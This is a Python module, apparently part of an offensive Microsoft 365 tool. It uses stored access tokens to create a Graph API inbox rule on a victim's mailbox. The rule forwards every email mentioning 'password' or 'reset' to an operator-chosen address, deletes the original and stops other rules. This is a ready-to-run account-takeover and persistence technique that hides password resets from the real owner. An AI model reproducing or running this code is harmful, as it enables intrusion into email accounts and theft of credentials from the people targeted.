import requests
import json
from os import system
from apiCalls.apiChooseUser import pickUser
from apiCalls.apiChooseUser import openTokenLibrary

#-----------Auth Headers------------------------------
def getHeaders(user):
    tokenLibrary = openTokenLibrary()
    headers={'Authorization': 'Bearer ' + tokenLibrary[user]['access_token'], 'Content-type': 'application/json'}
    return headers

#----------Create Rule -------------------------------
def createInboxRule(headers):
    #Change as needed

    data={      
    "displayName": "Forward",      
    "sequence": 2,      
    "isEnabled": "true",          
    "conditions": {
        "bodyContains": [
          "password", "reset"       
        ]
     },
     "actions": {
        "forwardTo": [
          {
             "emailAddress": {
                "name": "",
                "address": ""
              }
           }
        ],
        "Delete": "true",
        "stopProcessingRules": "true"
     }    
    }

    system('clear')
    print("(From 'apiCalls/apiCreateInboxRule.py', edit if needed)\n")
    print(json.dumps(data, indent=2))

    while True:
        confirmation = input('\nConfirm y/n: ')

        if confirmation.isnumeric():
            print('[-] Invalid input')
            continue
        elif confirmation == 'n' or confirmation =='q':
            system('clear')
            return
        elif confirmation == 'y':
            break
        else:
            print('[-] Invalid input')
            continue

    createRuleAPI = requests.post('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', json=data, headers=headers)

    if str(createRuleAPI) == '<Response [201]>':
            print('[+] Rule Created Successfully\n')
            input('Press ENTER to continue...')
            system('clear')
    else:
        print('[-] Error\n')
        createRuleAPI = createRuleAPI.json()
        print(json.dumps(createRuleAPI, indent=2))
        input('\nPress ENTER to continue...')
        system('clear')
    

def sendQuery(user):
    
    #set auth headers for API
    headers = getHeaders(user)

    #send API to create rule
    createInboxRule(headers)